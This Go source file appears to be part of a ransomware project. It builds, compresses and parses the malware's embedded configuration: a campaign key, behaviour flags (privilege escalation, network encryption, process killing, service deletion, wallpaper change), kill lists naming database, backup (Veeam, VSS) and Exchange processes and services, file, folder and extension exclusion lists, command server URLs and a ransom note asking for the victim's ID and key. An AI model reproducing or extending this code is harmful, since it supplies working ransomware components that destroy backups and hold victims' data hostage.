package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"

	"github.com/pierrec/lz4/v4"
)

var CompressedConfig = []byte{4, 34, 77, 24, 100, 112, 185, 83, 5, 0, 0, 244, 27, 1, 0, 64, 99, 80, 101, 116, 101, 114, 114, 121, 255, 160, 49, 104, 254, 213, 18, 97, 27, 75, 192, 146, 104, 251, 41, 37, 72, 43, 246, 200, 134, 120, 74, 61, 175, 222, 154, 182, 134, 224, 94, 40, 0, 102, 0, 0, 0, 1, 1, 1, 56, 0, 244, 233, 46, 153, 14, 205, 0, 0, 0, 0, 132, 87, 106, 75, 0, 0, 0, 0, 45, 58, 23, 79, 0, 0, 0, 0, 156, 92, 199, 78, 0, 0, 0, 0, 36, 13, 159, 201, 0, 0, 0, 0, 86, 253, 182, 73, 0, 0, 0, 0, 33, 106, 62, 223, 0, 0, 0, 0, 44, 29, 136, 3, 0, 0, 0, 0, 87, 253, 58, 109, 0, 0, 0, 0, 244, 18, 123, 156, 0, 0, 0, 0, 40, 134, 75, 195, 0, 0, 0, 0, 118, 40, 226, 201, 0, 0, 0, 0, 156, 60, 235, 76, 0, 0, 0, 0, 34, 60, 110, 233, 0, 0, 0, 0, 251, 21, 95, 229, 0, 0, 0, 0, 176, 122, 50, 105, 0, 0, 0, 0, 93, 57, 103, 69, 0, 0, 0, 0, 206, 144, 254, 81, 0, 0, 0, 0, 47, 125, 79, 213, 0, 0, 0, 0, 44, 105, 46, 243, 0, 0, 0, 0, 89, 252, 114, 115, 0, 0, 0, 0, 60, 89, 82, 237, 0, 0, 0, 0, 173, 73, 15, 235, 0, 0, 0, 0, 180, 136, 42, 190, 0, 0, 0, 0, 161, 198, 50, 221, 0, 0, 0, 0, 98, 236, 174, 233, 0, 0, 0, 0, 45, 12, 111, 201, 0, 0, 0, 0, 92, 108, 98, 225, 0, 0, 0, 0, 108, 59, 8, 139, 0, 0, 0, 0, 81, 211, 214, 114, 0, 0, 0, 0, 102, 92, 59, 93, 0, 0, 0, 0, 16, 1, 248, 21, 106, 108, 30, 99, 0, 0, 0, 0, 170, 109, 14, 93, 0, 0, 0, 0, 173, 121, 15, 205, 0, 0, 0, 0, 164, 29, 24, 233, 0, 0, 0, 0, 97, 43, 174, 201, 240, 0, 200, 243, 29, 152, 3, 0, 0, 0, 0, 183, 16, 34, 186, 72, 0, 255, 15, 104, 116, 116, 112, 115, 58, 47, 47, 99, 104, 117, 111, 110, 103, 100, 111, 110, 103, 46, 99, 111, 109, 121, 101, 101, 116, 104, 116, 116, 112, 25, 0, 2, 4, 131, 0, 243, 34, 4, 34, 77, 24, 100, 112, 185, 18, 1, 0, 0, 147, 32, 32, 32, 95, 95, 95, 95, 95, 32, 1, 0, 9, 13, 0, 6, 2, 0, 21, 95, 10, 0, 226, 32, 32, 32, 32, 10, 32, 32, 47, 32, 95, 95, 95, 95, 124, 16, 27, 0, 242, 200, 35, 124, 32, 32, 0, 2, 2, 0, 226, 10, 32, 124, 32, 124, 32, 32, 95, 95, 32, 32, 95, 95, 95, 13, 0, 0, 127, 0, 82, 32, 95, 95, 32, 95, 9, 0, 18, 32, 24, 0, 83, 95, 32, 95, 95, 95, 26, 0, 2, 54, 0, 147, 124, 95, 32, 124, 47, 32, 95, 32, 92, 84, 0, 98, 124, 32, 39, 95, 95, 124, 27, 0, 147, 32, 39, 95, 32, 92, 124, 32, 95, 95, 33, 0, 242, 3, 39, 95, 95, 124, 10, 32, 124, 32, 124, 95, 95, 124, 32, 124, 32, 40, 95, 41, 13, 0, 2, 15, 0, 66, 32, 124, 32, 124, 58, 0, 2, 24, 0, 5, 33, 0, 2, 216, 0, 196, 92, 95, 95, 95, 95, 95, 124, 92, 95, 95, 95, 47, 13, 0, 211, 95, 124, 32, 32, 32, 92, 95, 95, 44, 32, 124, 32, 46, 24, 0, 115, 92, 95, 95, 95, 47, 124, 95, 54, 0, 15, 2, 0, 7, 67, 95, 95, 47, 32, 180, 0, 10, 2, 0, 25, 10, 14, 0, 10, 2, 0, 22, 124, 93, 0, 11, 2, 0, 240, 1, 10, 45, 45, 62, 32, 89, 111, 117, 114, 32, 73, 68, 58, 32, 37, 115, 16, 0, 224, 15, 0, 244, 1, 107, 101, 121, 58, 32, 37, 120, 10, 0, 0, 0, 0, 238, 91, 146, 23, 45, 1, 72, 64, 109, 218, 37, 120, 1, 3, 61, 1, 244, 24, 27, 0, 0, 128, 103, 48, 95, 108, 52, 110, 71, 95, 49, 83, 95, 70, 117, 78, 95, 105, 53, 110, 84, 95, 49, 84, 46, 108, 111, 99, 107, 0, 0, 0, 0, 147, 19, 118, 38, 70, 0, 248, 69, 1, 222, 210, 149, 0, 0, 0, 0, 25, 57, 250, 222, 0, 0, 0, 0, 114, 251, 38, 235, 0, 0, 0, 0, 71, 184, 222, 84, 0, 0, 0, 0, 141, 16, 128, 125, 0, 0, 0, 0, 217, 176, 66, 149, 0, 0, 0, 0, 124, 185, 70, 85, 0, 0, 0, 0, 153, 223, 106, 21, 0, 0, 0, 0, 32, 103, 51, 225, 0, 0, 0, 0, 181, 144, 252, 74, 0, 0, 0, 0, 90, 80, 74, 84, 150, 0, 248, 157, 97, 181, 178, 12, 0, 0, 0, 0, 205, 164, 198, 15, 0, 0, 0, 0, 253, 86, 18, 71, 0, 0, 0, 0, 52, 28, 120, 199, 0, 0, 0, 0, 192, 198, 201, 9, 0, 0, 0, 0, 222, 244, 52, 90, 0, 0, 0, 0, 137, 137, 186, 100, 0, 0, 0, 0, 153, 187, 27, 87, 0, 0, 0, 0, 108, 173, 46, 223, 0, 0, 0, 0, 206, 133, 114, 188, 0, 0, 0, 0, 231, 125, 246, 70, 0, 0, 0, 0, 217, 24, 43, 205, 0, 0, 0, 0, 68, 119, 71, 76, 0, 0, 0, 0, 206, 164, 30, 15, 0, 0, 0, 0, 89, 10, 103, 97, 0, 0, 0, 0, 104, 252, 154, 77, 0, 0, 0, 0, 97, 160, 37, 68, 0, 0, 0, 0, 254, 160, 38, 15, 0, 0, 0, 0, 158, 177, 57, 80, 0, 0, 0, 0, 155, 107, 79, 199, 0, 0, 0, 0, 108, 138, 210, 220, 0, 0, 0, 0, 192, 213, 213, 49, 184, 0, 242, 51, 50, 25, 168, 3, 0, 0, 0, 0, 87, 41, 158, 82, 0, 0, 0, 0, 34, 25, 8, 3, 0, 0, 0, 0, 184, 26, 32, 3, 0, 0, 0, 0, 92, 41, 198, 82, 0, 0, 0, 0, 112, 26, 96, 3, 0, 0, 0, 0, 165, 89, 111, 211, 0, 0, 0, 0, 240, 28, 160, 3, 0, 0, 0, 0, 102, 27, 40, 0, 34, 176, 27, 38, 3, 243, 50, 164, 27, 120, 3, 0, 0, 0, 0, 118, 25, 144, 3, 0, 0, 0, 0, 43, 28, 24, 219, 0, 0, 0, 0, 175, 26, 24, 3, 0, 0, 0, 0, 107, 27, 112, 3, 0, 0, 0, 0, 51, 25, 112, 213, 0, 0, 0, 0, 56, 30, 128, 3, 0, 0, 0, 0, 51, 29, 64, 3, 0, 0, 0, 0, 172, 40, 0, 19, 163, 80, 0, 147, 156, 44, 238, 82, 0, 0, 0, 0, 181, 16, 0, 34, 182, 24, 112, 0, 34, 98, 28, 8, 0, 34, 161, 27, 64, 0, 162, 77, 105, 251, 118, 0, 0, 0, 0, 50, 29, 104, 0, 162, 57, 27, 40, 3, 0, 0, 0, 0, 108, 25, 184, 0, 34, 243, 27, 8, 0, 162, 36, 25, 104, 3, 0, 0, 0, 0, 97, 26, 192, 0, 34, 56, 28, 48, 0, 147, 51, 29, 200, 3, 0, 0, 0, 0, 179, 128, 0, 34, 169, 24, 168, 0, 34, 44, 25, 96, 0, 242, 19, 63, 212, 127, 153, 0, 0, 0, 0, 165, 25, 192, 3, 0, 0, 0, 0, 246, 12, 192, 1, 0, 0, 0, 0, 226, 117, 178, 216, 0, 0, 0, 0, 49, 28, 0, 1, 162, 153, 233, 6, 79, 0, 0, 0, 0, 45, 25, 8, 1, 34, 44, 29, 64, 0, 34, 237, 28, 16, 0, 34, 244, 24, 96, 1, 34, 102, 28, 32, 1, 147, 238, 24, 72, 3, 0, 0, 0, 0, 169, 224, 0, 0, 246, 2, 240, 5, 116, 101, 114, 114, 64, 163, 161, 233, 0, 0, 0, 0, 64, 99, 80, 101, 116, 101, 114, 114, 0, 0, 0, 0, 119, 16, 30, 129}

func compress(input []byte) ([]byte, error) {
	var buff bytes.Buffer
	writer := lz4.NewWriter(&buff)
	_, err := writer.Write(input)

	if err != nil {
		return nil, err
	}
	writer.Close()
	return buff.Bytes(), nil
}

func decompress(input []byte) ([]byte, error) {
	var out []byte
	buffer := make([]byte, 64)
	reader := lz4.NewReader(bytes.NewReader(input))

	for {
		numBytes, err := reader.Read(buffer)

		if err != nil && err != io.EOF {
			return nil, err
		}
		out = append(out, buffer[:numBytes]...)

		if err == io.EOF {
			break
		}
	}
	return out, nil
}

type Configuration struct {
	version                 []int
	campaignKey             [32]byte
	largeFileEncryptFlag    bool
	privilegeEscalationFlag bool
	networkEncryptFlag      bool
	terminateProcessFlag    bool
	deleteServiceFlag       bool
	wallpaperFlag           bool
	runOnceFlag             bool
	serverCommunicationFlag bool
	processHashList         []uint32
	serviceHashList         []uint32
	remoteServerURLList     [][]byte
	ransomNoteContent       []byte
	ransomNoteContentHash   uint32
	runOnceString           []byte
	fileHashList            []uint32
	folderHashList          []uint32
	extensionHashList       []uint32
	configurationHash       uint32
}

func createConfiguration() (*Configuration, error) {
	config := Configuration{}
	return &config, nil
}

func (config *Configuration) setVersion(version []int) {
	config.version = version
}

func (config *Configuration) setCampaignKey(campaignKey [32]byte) {
	config.campaignKey = campaignKey
}

func (config *Configuration) setFlags(flags []bool) {
	config.largeFileEncryptFlag = flags[0]
	config.privilegeEscalationFlag = flags[1]
	config.networkEncryptFlag = flags[2]
	config.terminateProcessFlag = flags[3]
	config.deleteServiceFlag = flags[4]
	config.wallpaperFlag = flags[5]
	config.runOnceFlag = flags[6]
	config.serverCommunicationFlag = flags[7]
}

func (config *Configuration) setProcessHashList(processHashList []uint32) {
	config.processHashList = processHashList
}

func (config *Configuration) appendProcessHashList(hash uint32) {
	config.processHashList = append(config.processHashList, hash)
}

func (config *Configuration) removeProcessHashList(hash uint32) {
	for index, eachHash := range config.processHashList {
		if eachHash == hash {
			config.processHashList = append(config.processHashList[:index], config.processHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setFileHashList(fileHashList []uint32) {
	config.fileHashList = fileHashList
}

func (config *Configuration) appendFileHashList(hash uint32) {
	config.fileHashList = append(config.fileHashList, hash)
}

func (config *Configuration) removeFileHashList(hash uint32) {
	for index, eachHash := range config.fileHashList {
		if eachHash == hash {
			config.fileHashList = append(config.fileHashList[:index], config.fileHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setFolderHashList(folderHashList []uint32) {
	config.folderHashList = folderHashList
}

func (config *Configuration) appendFolderHashList(hash uint32) {
	config.folderHashList = append(config.folderHashList, hash)
}

func (config *Configuration) removeFolderHashList(hash uint32) {
	for index, eachHash := range config.folderHashList {
		if eachHash == hash {
			config.folderHashList = append(config.folderHashList[:index], config.folderHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setExtensionHashList(extensionHashList []uint32) {
	config.extensionHashList = extensionHashList
}

func (config *Configuration) appendExtensionHashList(hash uint32) {
	config.extensionHashList = append(config.extensionHashList, hash)
}

func (config *Configuration) removeExtensionHashList(hash uint32) {
	for index, eachHash := range config.extensionHashList {
		if eachHash == hash {
			config.extensionHashList = append(config.extensionHashList[:index], config.extensionHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setServiceHashList(serviceHashList []uint32) {
	config.serviceHashList = serviceHashList
}

func (config *Configuration) appendServiceHashList(hash uint32) {
	config.serviceHashList = append(config.serviceHashList, hash)
}

func (config *Configuration) removeServiceHashList(hash uint32) {
	for index, eachHash := range config.serviceHashList {
		if eachHash == hash {
			config.serviceHashList = append(config.serviceHashList[:index], config.serviceHashList[index+1:]...)
			return
		}
	}
}

func (config *Configuration) setRemoteServerURLList(remoteServerURLList [][]byte) {
	config.remoteServerURLList = remoteServerURLList
}

func (config *Configuration) addRemoteServerURLList(remoteServerURL []byte) {
	config.remoteServerURLList = append(config.remoteServerURLList, remoteServerURL)
}

func (config *Configuration) setRansomNoteContent(ransomNoteContent []byte) {
	config.ransomNoteContent = ransomNoteContent
}

func (config *Configuration) setRansomNoteContentHash(ransomNoteContentHash uint32) {
	config.ransomNoteContentHash = ransomNoteContentHash
}

func (config *Configuration) setConfigurationHash(configurationHash uint32) {
	config.configurationHash = configurationHash
}

func (config *Configuration) setRunOnceString(runOnceString []byte) {
	config.runOnceString = runOnceString
}

// note:implement for when fields are empty
func (config *Configuration) toBytes() []byte {
	var result []byte

	separator := []byte("@cPeterr")

	// add version

	for _, val := range config.version {
		result = append(result, byte(val))
	}
	result = append(result, separator...)

	// add campaignKey
	result = append(result, config.campaignKey[:]...)
	result = append(result, separator...)

	// add flags
	flags := []bool{config.largeFileEncryptFlag, config.privilegeEscalationFlag, config.networkEncryptFlag,
		config.terminateProcessFlag, config.deleteServiceFlag, config.wallpaperFlag, config.runOnceFlag, config.serverCommunicationFlag}

	for _, flag := range flags {
		if flag {
			result = append(result, byte(1))
		} else {
			result = append(result, byte(0))
		}
	}

	result = append(result, separator...)

	// add process hash list
	hashBuffer := make([]byte, 8)

	for _, eachHash := range config.processHashList {
		binary.LittleEndian.PutUint32(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}

	result = append(result, separator...)

	// add service hash list

	for _, eachHash := range config.serviceHashList {
		binary.LittleEndian.PutUint32(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}

	result = append(result, separator...)

	// add remote server url list

	for _, urlBuffer := range config.remoteServerURLList {
		result = append(result, urlBuffer...)
		result = append(result, []byte("yeet")...)
	}

	result = append(result, separator...)

	// add ransomNoteContent
	result = append(result, config.ransomNoteContent...)

	result = append(result, separator...)

	// add ransomNoteContentHash
	binary.LittleEndian.PutUint32(hashBuffer, config.ransomNoteContentHash)
	result = append(result, hashBuffer...)
	result = append(result, separator...)

	// add runOncestring
	result = append(result, config.runOnceString...)
	result = append(result, separator...)

	// add fileHashList

	for _, eachHash := range config.fileHashList {
		binary.LittleEndian.PutUint32(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}
	result = append(result, separator...)

	// add folderHashList

	for _, eachHash := range config.folderHashList {
		binary.LittleEndian.PutUint32(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}
	result = append(result, separator...)

	// add extensionHashList
	for _, eachHash := range config.extensionHashList {
		binary.LittleEndian.PutUint32(hashBuffer, eachHash)

		result = append(result, hashBuffer...)
	}
	result = append(result, separator...)

	config.ransomNoteContentHash = bufferHashing(result)
	// add configurationHash
	binary.LittleEndian.PutUint32(hashBuffer, config.ransomNoteContentHash)
	result = append(result, hashBuffer...)
	result = append(result, separator...)
	return result
}

func parseConfig(configBuffer []byte) (Configuration, error) {

	config := Configuration{}

	// parse version
	version := []int{}
	version = append(version, int(configBuffer[0]))
	version = append(version, int(configBuffer[1]))
	config.setVersion(version)

	// parse campaignKey
	index := 2

	index = skipSeparator(configBuffer, index)

	campaignKey := [32]byte{}
	for i, each := range configBuffer[index : index+32] {
		campaignKey[i] = each
	}

	config.setCampaignKey(campaignKey)

	flagPointers := []*bool{&config.largeFileEncryptFlag, &config.privilegeEscalationFlag, &config.networkEncryptFlag,
		&config.terminateProcessFlag, &config.deleteServiceFlag, &config.wallpaperFlag, &config.runOnceFlag, &config.serverCommunicationFlag}

	index = skipSeparator(configBuffer, index)

	for i, each := range configBuffer[index : index+8] {
		*flagPointers[i] = int(each) == 1
	}

	index = skipSeparator(configBuffer, index)

	//parse process hash list
	for {
		config.processHashList = append(config.processHashList, binary.LittleEndian.Uint32(configBuffer[index:index+8]))
		index += 8
		if string(configBuffer[index:index+8]) == "@cPeterr" {
			break
		}
	}
	index = skipSeparator(configBuffer, index)

	// parse service hash list
	for {
		config.serviceHashList = append(config.serviceHashList, binary.LittleEndian.Uint32(configBuffer[index:index+8]))
		index += 8
		if string(configBuffer[index:index+8]) == "@cPeterr" {
			break
		}
	}
	index = skipSeparator(configBuffer, index)

	// parse  remote server url list
	urlBuffer := []byte{}
	for {
		urlBuffer = []byte{}

		for ; string(configBuffer[index:index+4]) != "yeet"; index++ {
			urlBuffer = append(urlBuffer, configBuffer[index])
		}
		index += 4
		config.remoteServerURLList = append(config.remoteServerURLList, urlBuffer)
		if string(configBuffer[index:index+8]) == "@cPeterr" {
			break
		}
	}
	index = skipSeparator(configBuffer, index)
	// parse ransom note content

	oldIndex := index

	index = skipSeparator(configBuffer, index)

	ransomNoteContent, err := decompress(configBuffer[oldIndex : index-8])
	ransomNoteContentHash := bufferHashing(configBuffer[oldIndex : index-8])
	if err != nil {
		ransomNoteContent = configBuffer[oldIndex : index-8]
		ransomNoteContentHash = bufferHashing(ransomNoteContent)
	}
	config.setRansomNoteContent(ransomNoteContent)

	// parse ransom note hash
	if ransomNoteContentHash != binary.LittleEndian.Uint32(configBuffer[index:index+8]) {
		return config, fmt.Errorf("Wrong ransom note content hash")
	}
	config.setRansomNoteContentHash(ransomNoteContentHash)

	index = skipSeparator(configBuffer, index)

	// parse runOncestring
	oldIndex = index

	index = skipSeparator(configBuffer, index)

	runOnceString, err := decompress(configBuffer[oldIndex : index-8])
	if err != nil {
		runOnceString = configBuffer[oldIndex : index-8]
	}
	config.setRunOnceString(runOnceString)

	// parse fileHashList
	for {
		config.fileHashList = append(config.fileHashList, binary.LittleEndian.Uint32(configBuffer[index:index+8]))
		index += 8
		if string(configBuffer[index:index+8]) == "@cPeterr" {
			break
		}
	}
	index = skipSeparator(configBuffer, index)

	// parse folderHashList

	for {
		config.folderHashList = append(config.folderHashList, binary.LittleEndian.Uint32(configBuffer[index:index+8]))
		index += 8
		if string(configBuffer[index:index+8]) == "@cPeterr" {
			break
		}
	}
	index = skipSeparator(configBuffer, index)

	// parse extensionHashList

	for {
		config.extensionHashList = append(config.extensionHashList, binary.LittleEndian.Uint32(configBuffer[index:index+8]))
		index += 8
		if string(configBuffer[index:index+8]) == "@cPeterr" {
			break
		}
	}
	index = skipSeparator(configBuffer, index)

	configHash := bufferHashing(configBuffer[:len(configBuffer)-16])

	if configHash != binary.LittleEndian.Uint32(configBuffer[index:index+8]) {
		return config, fmt.Errorf("Wrong config hash")
	}

	config.setConfigurationHash(configHash)

	return config, nil
}

func skipSeparator(configBuffer []byte, currIndex int) int {
	for {
		if currIndex+8 >= len(configBuffer) {
			break
		}
		if string(configBuffer[currIndex:currIndex+8]) == "@cPeterr" {
			currIndex += 8
			break
		}
		currIndex++
	}
	return currIndex
}
func populateConfig() {
	config := Configuration{}

	version := []int{1, 0}
	config.setVersion(version)

	campaignKey := [32]byte{121, 255, 160, 49, 104, 254, 213, 18, 97, 27, 75, 192, 146, 104, 251, 41, 37, 72, 43, 246, 200, 134, 120, 74, 61, 175, 222, 154, 182, 134, 224, 94}
	config.setCampaignKey(campaignKey)

	largeFileEncryptFlag := false
	privilegeEscalationFlag := false
	networkEncryptFlag := false
	terminateProcessFlag := true
	deleteServiceFlag := true
	wallpaperFlag := true
	runOnceFlag := true
	serverCommunicationFlag := false
	config.setFlags([]bool{largeFileEncryptFlag, privilegeEscalationFlag, networkEncryptFlag,
		terminateProcessFlag, deleteServiceFlag, wallpaperFlag, runOnceFlag, serverCommunicationFlag})

	processHashList := stringListToHashList([]string{"thebat", "msaccess", "firefox", "notepad", "ocssd", "encsvc", "dbeng50", "sql", "agntsvc", "isqlplussvc", "xfssvccon", "tbirdconfig", "wordpad", "dbsnmp", "infopath", "powerpnt", "oracle", "ocautoupds", "visio", "excel", "winword", "synctime", "steam", "thunderbird", "sqbcoreservice", "mspub", "ocomm", "onenote", "mydesktopqos", "mydesktopservice", "outlook"})
	config.setProcessHashList(processHashList)

	serviceHashList := stringListToHashList([]string{"mepocs", "memtas", "veeam", "svc$", "backup", "sql", "vss", "msexchange"})
	config.setServiceHashList(serviceHashList)

	remoteServerURLList := [][]byte{[]byte("https://chuongdong.com"), []byte("http://chuongdong.com")}
	config.setRemoteServerURLList(remoteServerURLList)

	ransomNoteContent, err := compress([]byte("   _____        _____                  _             \n  / ____|      / ____|                | |            \n | |  __  ___ | |     _ __ _   _ _ __ | |_ ___  _ __ \n | | |_ |/ _ \\| |    | '__| | | | '_ \\| __/ _ \\| '__|\n | |__| | (_) | |____| |  | |_| | |_) | || (_) | |   \n  \\_____|\\___/ \\_____|_|   \\__, | .__/ \\__\\___/|_|   \n                            __/ | |                  \n                           |___/|_|                  \n--> Your ID: %s\n--> Your key: %x\n"))

	if err != nil {
		fmt.Println("Can't compress", err.Error())
		ransomNoteContent = []byte("   _____        _____                  _             \n  / ____|      / ____|                | |            \n | |  __  ___ | |     _ __ _   _ _ __ | |_ ___  _ __ \n | | |_ |/ _ \\| |    | '__| | | | '_ \\| __/ _ \\| '__|\n | |__| | (_) | |____| |  | |_| | |_) | || (_) | |   \n  \\_____|\\___/ \\_____|_|   \\__, | .__/ \\__\\___/|_|   \n                            __/ | |                  \n                           |___/|_|                  --> Your ID: %s\n--> Your key: %x\n")
	}
	config.setRansomNoteContent(ransomNoteContent)
	config.setRansomNoteContentHash(bufferHashing(config.ransomNoteContent))

	runOnceString, err := compress([]byte("g0_l4nG_1S_FuN_i5nT_1T.lock"))
	if err != nil {
		fmt.Println("Can't compress", err.Error())
		runOnceString = []byte("g0_l4nG_1S_FuN_i5nT_1T.lock")
	}
	config.setRunOnceString(runOnceString)

	fileHashList := stringListToHashList([]string{"bootfont.bin", "thumbs.db", "ntldr", "ntuser.dat", "iconcache.db", "autorun.inf", "ntuser.ini", "bootsect.bak", "boot.ini", "ntuser.dat.log", "desktop.ini"})
	config.setFileHashList(fileHashList)

	folderHashList := stringListToHashList([]string{"program files (x86)", "$windows.~ws", "msocache", "boot", "program files", "application data", "tor browser", "mozilla", "intel", "programdata", "default", "appdata", "all users", "$windows.~bt", "google", "windows", "$recycle.bin", "windows.old", "config.msi", "public", "perflogs", "system volume information"})
	config.setFolderHashList(folderHashList)

	extensionHashList := stringListToHashList([]string{"cur", "diagcab", "cab", "idx", "diagcfg", "hlp", "theme", "rtp", "ldf", "msp", "mod", "drv", "lock", "ico", "lnk", "icns", "wpx", "shs", "icl", "msc", "diagpkg", "msu", "adv", "pdb", "mpa", "msstyles", "scr", "key", "dll", "nls", "cmd", "hta", "ocx", "sys", "ics", "ani", "cpl", "deskthemepack", "exe", "386", "themepack", "ps1", "nomedia", "com", "spl", "rom", "bat", "prf", "bin", "msi"})
	config.setExtensionHashList(extensionHashList)

	fmt.Println(compress(config.toBytes()))
}

func stringListToHashList(list []string) []uint32 {
	result := []uint32{}

	for _, each := range list {
		result = append(result, bufferHashing([]byte(each)))
	}
	return result
}
